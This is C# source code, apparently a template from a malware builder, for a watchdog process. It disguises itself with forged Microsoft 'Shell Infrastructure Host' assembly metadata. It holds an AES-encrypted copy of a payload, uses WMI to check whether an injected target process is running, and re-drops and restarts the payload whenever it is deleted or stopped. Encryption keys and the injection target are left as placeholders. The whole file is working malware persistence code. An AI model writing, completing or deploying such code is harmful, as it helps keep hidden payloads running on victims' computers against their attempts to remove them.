﻿using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
#if DefDebug
using System.Windows.Forms;
#endif

[assembly: AssemblyTitle("Shell Infrastructure Host")]
[assembly: AssemblyDescription("Shell Infrastructure Host")]
[assembly: AssemblyProduct("Microsoft® Windows® Operating System")]
[assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
[assembly: AssemblyFileVersion("10.0.19041.746")]

public partial class Program
{
    public static byte[] et = new byte[] { };
    public static string plp = "";
    public static int checkcount = 0;

    public static void Main()
    {
        try
        {
            plp = PayloadPath;
            et = RAES_Encryptor(File.ReadAllBytes(plp));
            RWDLoop();
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W1: " + Environment.NewLine + ex.ToString());
#endif
            Environment.Exit(0);
        }
    }

    public static void RWDLoop()
    {
        try
        {
            if (!RCheckProc())
            {
                if (!File.Exists(plp))
                {
                    File.WriteAllBytes(plp, RAES_Decryptor(et));
                    Process.Start(plp);
                }
                else if (checkcount < 2)
                {
                    checkcount += 1;
                }
                else
                {
                    checkcount = 0;
                    Process.Start(plp);
                }
            }
            else
            {
                checkcount = 0;
                if (!File.Exists(plp))
                {
                    File.WriteAllBytes(plp, RAES_Decryptor(et));
                    Process.Start(plp);
                }
            }

            int startDelay = 0;
            if (int.TryParse("#STARTDELAY", out startDelay) && startDelay > 0)
            {
                Thread.Sleep(startDelay * 1000 + 5000);
            }
            else
            {
                Thread.Sleep(10000);
            }

            RWDLoop();
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W2: " + Environment.NewLine + ex.ToString());
#endif
        }

    }

    public static string RGetString(string input)
    {
        return Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String(input)));
    }

    public static bool RCheckProc()
    {
        try
        {
            var options = new ConnectionOptions();
            options.Impersonation = ImpersonationLevel.Impersonate;
            var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
            scope.Connect();

            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
            var query = new ObjectQuery(wmiQuery);
            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
            var managementObjectCollection = managementObjectSearcher.Get();
            foreach (ManagementObject retObject in managementObjectCollection)
            {
                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--cinit-find-e"))
                {
                    return true;
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W3: " + Environment.NewLine + ex.ToString());
#endif
        }
        return false;
    }

    public static byte[] RAES_Decryptor(byte[] input)
    {
        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
        var symmetricKey = new RijndaelManaged();
        symmetricKey.KeySize = 256;
        symmetricKey.Mode = CipherMode.CBC;
        var decryptor = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes);
        using (var mStream = new MemoryStream())
        {
            using (var cStream = new CryptoStream(mStream, decryptor, CryptoStreamMode.Write))
            {
                cStream.Write(input, 0, input.Length);
                cStream.Close();
            }

            return mStream.ToArray();
        }
    }

    public static byte[] RAES_Encryptor(byte[] input)
    {
        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
        var symmetricKey = new RijndaelManaged();
        symmetricKey.KeySize = 256;
        symmetricKey.Mode = CipherMode.CBC;
        var encryptor = symmetricKey.CreateEncryptor(k1.GetBytes(16), initVectorBytes);
        using (var mStream = new MemoryStream())
        {
            using (var cStream = new CryptoStream(mStream, encryptor, CryptoStreamMode.Write))
            {
                cStream.Write(input, 0, input.Length);
                cStream.Close();
            }

            return mStream.ToArray();
        }
    }
}